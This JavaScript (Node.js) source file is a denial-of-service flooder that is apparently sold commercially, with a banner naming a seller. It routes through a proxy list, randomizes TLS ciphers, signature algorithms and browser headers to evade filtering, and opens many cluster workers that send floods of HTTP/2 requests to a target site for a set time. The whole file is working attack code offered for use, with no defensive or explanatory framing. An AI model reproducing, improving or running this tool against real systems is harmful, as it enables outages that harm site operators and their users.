const net = require("net"),
  http2 = require("http2"),
  tls = require("tls"),
  cluster = require("cluster"),
  url = require("url"),
  crypto = require("crypto"),
  fs = require("fs"),
  {
    exec
  } = require("child_process");
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", function (_0x56572b) {});
process.argv.length < 7 && (console.log("node url time rate threads proxyfile"), process.exit());
const headers = {};
function readLines(_0x60021a) {
  return fs.readFileSync(_0x60021a, "utf-8").toString().split(/\r?\n/);
}
function randomIntn(_0x42d567, _0x41612a) {
  return Math.floor(Math.random() * (_0x41612a - _0x42d567) + _0x42d567);
}
function randomElement(_0x7681e3) {
  return _0x7681e3[randomIntn(0, _0x7681e3.length)];
}
function randstr(_0x2ddabb) {
  const _0x28dcea = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let _0x13fdc7 = "";
  const _0x118870 = _0x28dcea.length;
  for (let _0x2c15c1 = 0; _0x2c15c1 < _0x2ddabb; _0x2c15c1++) {
    _0x13fdc7 += _0x28dcea.charAt(Math.floor(Math.random() * _0x118870));
  }
  return _0x13fdc7;
}
const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
  },
  sig = ["ecdsa_secp256r1_sha256", "ecdsa_secp384r1_sha384", "ecdsa_secp521r1_sha512", "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512", "ecdsa_brainpoolP256r1tls13_sha256", "ecdsa_brainpoolP384r1tls13_sha384", "ecdsa_brainpoolP512r1tls13_sha512", "ecdsa_sha1", "ed25519", "ed448", "ecdsa_sha224", "rsa_pkcs1_sha1", "rsa_pss_pss_sha256", "dsa_sha256", "dsa_sha384", "dsa_sha512", "dsa_sha224", "dsa_sha1", "rsa_pss_pss_sha384", "rsa_pkcs1_sha2240", "rsa_pss_pss_sha512", "sm2sig_sm3", "ecdsa_secp521r1_sha512", "rsa_pss_rsae_sha256", "rsa_pss_rsae_sha384", "rsa_pss_rsae_sha512", "rsa_pkcs1_sha256", "rsa_pkcs1_sha384", "rsa_pkcs1_sha512"],
  cplist = ["RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA", "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL", "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5", "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS", "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK", "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK"];
const type = ["text/plain", "text/html", "application/json", "application/xml", "multipart/form-data", "application/octet-stream", "image/jpeg", "image/png", "audio/mpeg", "video/mp4", "application/javascript", "application/pdf", "application/vnd.ms-excel", "application/vnd.ms-powerpoint", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", "application/vnd.openxmlformats-officedocument.presentationml.presentation", "application/vnd.openxmlformats-officedocument.wordprocessingml.document", "application/zip", "image/gif", "image/bmp", "image/tiff", "audio/wav", "audio/midi", "video/avi", "video/mpeg", "video/quicktime", "text/csv", "text/xml", "text/css", "text/javascript", "application/graphql", "application/x-www-form-urlencoded", "application/vnd.api+json", "application/ld+json", "application/x-pkcs12", "application/x-pkcs7-certificates", "application/x-pkcs7-certreqresp", "application/x-pem-file", "application/x-x509-ca-cert", "application/x-x509-user-cert", "application/x-x509-server-cert", "application/x-bzip", "application/x-gzip", "application/x-7z-compressed", "application/x-rar-compressed", "application/x-shockwave-flash"];
lang_header = ["he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5", "en-US,en;q=0.5", "en-US,en;q=0.9", "de-CH;q=0.7", "da, en-gb;q=0.8, en;q=0.7", "cs;q=0.5", "en-US,en;q=0.9", "en-GB,en;q=0.9", "en-CA,en;q=0.9", "en-AU,en;q=0.9", "en-NZ,en;q=0.9", "en-ZA,en;q=0.9", "en-IE,en;q=0.9", "en-IN,en;q=0.9", "ar-SA,ar;q=0.9", "az-Latn-AZ,az;q=0.9", "be-BY,be;q=0.9", "bg-BG,bg;q=0.9", "bn-IN,bn;q=0.9", "ca-ES,ca;q=0.9", "cs-CZ,cs;q=0.9", "cy-GB,cy;q=0.9", "da-DK,da;q=0.9", "de-DE,de;q=0.9", "el-GR,el;q=0.9", "es-ES,es;q=0.9", "et-EE,et;q=0.9", "eu-ES,eu;q=0.9", "fa-IR,fa;q=0.9", "fi-FI,fi;q=0.9", "fr-FR,fr;q=0.9", "ga-IE,ga;q=0.9", "gl-ES,gl;q=0.9", "gu-IN,gu;q=0.9", "he-IL,he;q=0.9", "hi-IN,hi;q=0.9", "hr-HR,hr;q=0.9", "hu-HU,hu;q=0.9", "hy-AM,hy;q=0.9", "id-ID,id;q=0.9", "is-IS,is;q=0.9", "it-IT,it;q=0.9", "ja-JP,ja;q=0.9", "ka-GE,ka;q=0.9", "kk-KZ,kk;q=0.9", "km-KH,km;q=0.9", "kn-IN,kn;q=0.9", "ko-KR,ko;q=0.9", "ky-KG,ky;q=0.9", "lo-LA,lo;q=0.9", "lt-LT,lt;q=0.9", "lv-LV,lv;q=0.9", "mk-MK,mk;q=0.9", "ml-IN,ml;q=0.9", "mn-MN,mn;q=0.9", "mr-IN,mr;q=0.9", "ms-MY,ms;q=0.9", "mt-MT,mt;q=0.9", "my-MM,my;q=0.9", "nb-NO,nb;q=0.9", "ne-NP,ne;q=0.9", "nl-NL,nl;q=0.9", "nn-NO,nn;q=0.9", "or-IN,or;q=0.9", "pa-IN,pa;q=0.9", "pl-PL,pl;q=0.9", "pt-BR,pt;q=0.9", "pt-PT,pt;q=0.9", "ro-RO,ro;q=0.9", "ru-RU,ru;q=0.9", "si-LK,si;q=0.9", "sk-SK,sk;q=0.9", "sl-SI,sl;q=0.9", "sq-AL,sq;q=0.9", "sr-Cyrl-RS,sr;q=0.9", "sr-Latn-RS,sr;q=0.9", "sv-SE,sv;q=0.9", "sw-KE,sw;q=0.9", "ta-IN,ta;q=0.9", "te-IN,te;q=0.9", "th-TH,th;q=0.9", "tr-TR,tr;q=0.9", "uk-UA,uk;q=0.9", "ur-PK,ur;q=0.9", "uz-Latn-UZ,uz;q=0.9", "vi-VN,vi;q=0.9", "zh-CN,zh;q=0.9", "zh-HK,zh;q=0.9", "zh-TW,zh;q=0.9", "am-ET,am;q=0.8", "as-IN,as;q=0.8", "az-Cyrl-AZ,az;q=0.8", "bn-BD,bn;q=0.8", "bs-Cyrl-BA,bs;q=0.8", "bs-Latn-BA,bs;q=0.8", "dz-BT,dz;q=0.8", "fil-PH,fil;q=0.8", "fr-CA,fr;q=0.8", "fr-CH,fr;q=0.8", "fr-BE,fr;q=0.8", "fr-LU,fr;q=0.8", "gsw-CH,gsw;q=0.8", "ha-Latn-NG,ha;q=0.8", "hr-BA,hr;q=0.8", "ig-NG,ig;q=0.8", "ii-CN,ii;q=0.8", "is-IS,is;q=0.8", "jv-Latn-ID,jv;q=0.8", "ka-GE,ka;q=0.8", "kkj-CM,kkj;q=0.8", "kl-GL,kl;q=0.8", "km-KH,km;q=0.8", "kok-IN,kok;q=0.8", "ks-Arab-IN,ks;q=0.8", "lb-LU,lb;q=0.8", "ln-CG,ln;q=0.8", "mn-Mong-CN,mn;q=0.8", "mr-MN,mr;q=0.8", "ms-BN,ms;q=0.8", "mt-MT,mt;q=0.8", "mua-CM,mua;q=0.8", "nds-DE,nds;q=0.8", "ne-IN,ne;q=0.8", "nso-ZA,nso;q=0.8", "oc-FR,oc;q=0.8", "pa-Arab-PK,pa;q=0.8", "ps-AF,ps;q=0.8", "quz-BO,quz;q=0.8", "quz-EC,quz;q=0.8", "quz-PE,quz;q=0.8", "rm-CH,rm;q=0.8", "rw-RW,rw;q=0.8", "sd-Arab-PK,sd;q=0.8", "se-NO,se;q=0.8", "si-LK,si;q=0.8", "smn-FI,smn;q=0.8", "sms-FI,sms;q=0.8", "syr-SY,syr;q=0.8", "tg-Cyrl-TJ,tg;q=0.8", "ti-ER,ti;q=0.8", "te;q=0.9,en-US;q=0.8,en;q=0.7", "tk-TM,tk;q=0.8", "tn-ZA,tn;q=0.8", "tt-RU,tt;q=0.8", "ug-CN,ug;q=0.8", "uz-Cyrl-UZ,uz;q=0.8", "ve-ZA,ve;q=0.8", "wo-SN,wo;q=0.8", "xh-ZA,xh;q=0.8", "yo-NG,yo;q=0.8", "zgh-MA,zgh;q=0.8", "zu-ZA,zu;q=0.8"];
const control_header = ["max-age=604800", "proxy-revalidate", "public, max-age=0", "max-age=315360000", "public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800", "s-maxage=604800", "max-stale", "public, immutable, max-age=31536000", "must-revalidate", "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0", "max-age=31536000,public,immutable", "max-age=31536000,public", "min-fresh", "private", "public", "s-maxage", "no-cache", "no-cache, no-transform", "max-age=2592000", "no-store", "no-transform", "max-age=31557600", "stale-if-error", "only-if-cached", "max-age=0", "must-understand, no-store", "max-age=31536000; includeSubDomains", "max-age=31536000; includeSubDomains; preload", "max-age=120", "max-age=0,no-cache,no-store,must-revalidate", "public, max-age=604800, immutable", "max-age=0, must-revalidate, private", "max-age=0, private, must-revalidate", "max-age=604800, stale-while-revalidate=86400", "max-stale=3600", "public, max-age=2678400", "min-fresh=600", "public, max-age=30672000", "max-age=31536000, immutable", "max-age=604800, stale-if-error=86400", "public, max-age=604800", "no-cache, no-store,private, max-age=0, must-revalidate", "o-cache, no-store, must-revalidate, pre-check=0, post-check=0", "public, s-maxage=600, max-age=60", "public, max-age=31536000", "max-age=14400, public", "max-age=14400", "max-age=600, private", "public, s-maxage=600, max-age=60", "no-store, no-cache, must-revalidate", "no-cache, no-store,private, s-maxage=604800, must-revalidate", "Sec-CH-UA,Sec-CH-UA-Arch,Sec-CH-UA-Bitness,Sec-CH-UA-Full-Version-List,Sec-CH-UA-Mobile,Sec-CH-UA-Model,Sec-CH-UA-Platform,Sec-CH-UA-Platform-Version,Sec-CH-UA-WoW64"];
version = ["\"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"", "\"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"98\"", "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"", "\"Not_A Brand\";v=\"8\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"", "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"86\", \"Chromium\";v=\"86\"", "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"96\", \"Chromium\";v=\"96\"", "\"Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Microsoft Edge\";v=\"96\""];
const puki = ["GET", "POST", "PATCH", "PUT"];
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))],
  siga = sig[Math.floor(Math.floor(Math.random() * sig.length))],
  bnb = puki[Math.floor(Math.floor(Math.random() * puki.length))],
  control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))],
  ty = type[Math.floor(Math.floor(Math.random() * type.length))],
  proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);
if (cluster.isMaster) {
  for (let counter = 1; counter <= args.threads; counter++) {
    cluster.fork();
  }
  console.clear;
  console.log("       DRAGON SERVICE      ");
  console.log("[!] Attack has sent succesfully ");
  console.log("[!] Target: " + parsedTarget.host);
  console.log("[!] Time: " + args.time);
  console.log("[!] Threads: " + args.threads);
  console.log("[!] Requests per second: " + args.Rate);
  console.log("[!] Status: Succes!");
  console.log("Thanks For Buying Form @kyoura01");
} else {
  setInterval(runFlooder);
}
class NetSocket {
  constructor() {}
  HTTP(_0x273a1d, _0x4f18d5) {
    const _0x47314c = "CONNECT " + _0x273a1d.address + ":443 HTTP/1.1\r\nHost: " + _0x273a1d.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const _0x3bb57c = new Buffer.from(_0x47314c),
      _0x598692 = {
        host: _0x273a1d.host,
        port: _0x273a1d.port
      };
    const _0x1131a7 = net.connect(_0x598692);
    _0x1131a7.setTimeout(_0x273a1d.timeout * 600000);
    _0x1131a7.setKeepAlive(true, 600000);
    _0x1131a7.on("connect", () => {
      _0x1131a7.write(_0x3bb57c);
    });
    _0x1131a7.on("data", _0x903cd3 => {
      const _0x1f921b = _0x903cd3.toString("utf-8"),
        _0x5db5bf = _0x1f921b.includes("HTTP/1.1 200");
      if (_0x5db5bf === false) {
        _0x1131a7.destroy();
        return _0x4f18d5(undefined, "error: invalid response from proxy server");
      }
      return _0x4f18d5(_0x1131a7, undefined);
    });
    _0x1131a7.on("timeout", () => {
      _0x1131a7.destroy();
      return _0x4f18d5(undefined, "error: timeout exceeded");
    });
    _0x1131a7.on("error", _0x40b664 => {
      _0x1131a7.destroy();
      return _0x4f18d5(undefined, "error: " + _0x40b664);
    });
  }
}
const Socker = new NetSocket();
headers[":method"] = bnb;
headers[":authority"] = parsedTarget.host;
headers[":scheme"] = "https";
headers["Content-Type"] = ty;
headers.Connection = "keep-alive";
headers["CF-Cache-Status"] = "HIT";
headers.Age = "64440000";
headers["Cache-Control"] = control;
headers.Expires = "Thu, 25 Jan 2025 10:24:07 GMT";
headers["Last-Modified"] = "Thu, 25 Jan 2025 10:08:29 GMT";
headers.Vary = "Accept-Encoding";
headers["X-Content-Type-Options"] = "nosniff";
headers["X-Frame-Options"] = "SAMEORIGIN";
headers["x-RM"] = "GW";
headers["X-XSS-Protection"] = "1; mode=block";
headers["alt-svc"] = "h3=" + parsedTarget.host + ":443; ma=86400";
function runFlooder() {
  const _0x3534df = randomElement(proxies),
    _0x36d4ad = _0x3534df.split(":");
  headers.origin = "https://" + parsedTarget.host;
  const _0x7a807b = {
    host: _0x36d4ad[0],
    port: ~~_0x36d4ad[1],
    address: parsedTarget.host + ":443",
    timeout: 100
  };
  Socker.HTTP(_0x7a807b, (_0x5274ec, _0x1ec1dd) => {
    if (_0x1ec1dd) {
      return;
    }
    _0x5274ec.setKeepAlive(true, 200000);
    const _0x26ceb0 = {
      secure: true,
      ALPNProtocols: ["h2"],
      port: 443,
      followAllRedirects: true,
      challengeToSolve: 10,
      clientTimeout: 15000,
      clientlareMaxTimeout: 15000,
      sigals: siga,
      socket: _0x5274ec,
      ciphers: cipper,
      h2: true,
      ecdhCurve: "prime256v1:X25519",
      host: parsedTarget.host,
      rejectUnauthorized: false,
      servername: parsedTarget.host,
      secureProtocol: ["TLSv1_1_method", "TLS_method", "TLSv1_2_method", "TLSv1_3_method"]
    };
    const _0x27a576 = tls.connect(443, parsedTarget.host, _0x26ceb0);
    _0x27a576.setKeepAlive(true, 60000);
    const _0x139ec9 = {
      headerTableSize: 65536,
      maxConcurrentStreams: 10000,
      initialWindowSize: 6291456,
      maxHeaderListSize: 65536,
      enablePush: false
    };
    const _0x1b7f68 = {
      protocol: "https:",
      settings: _0x139ec9,
      maxSessionMemory: 64000,
      maxDeflateDynamicTableSize: 4294967295,
      createConnection: () => _0x27a576,
      socket: _0x5274ec
    };
    const _0x38fab7 = http2.connect(parsedTarget.href, _0x1b7f68),
      _0x28a490 = {
        headerTableSize: 65536,
        maxConcurrentStreams: 10000,
        initialWindowSize: 6291456,
        maxHeaderListSize: 65536,
        enablePush: false
      };
    _0x38fab7.settings(_0x28a490);
    setInterval(() => {
      _0x38fab7.on("connect", () => {
        for (let _0x5bf7af = 0; _0x5bf7af < args.Rate; _0x5bf7af++) {
          const _0x24e233 = _0x38fab7.request(headers);
          _0x24e233.on("response", _0x286350 => {
            _0x24e233.close();
            _0x24e233.destroy();
            return;
          });
          _0x24e233.end();
        }
      });
    });
    _0x38fab7.on("close", () => {
      _0x38fab7.destroy();
      _0x5274ec.destroy();
      return;
    });
  });
  (function (_0x522241, _0x1c2ada, _0x336b38) {});
}
const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1000);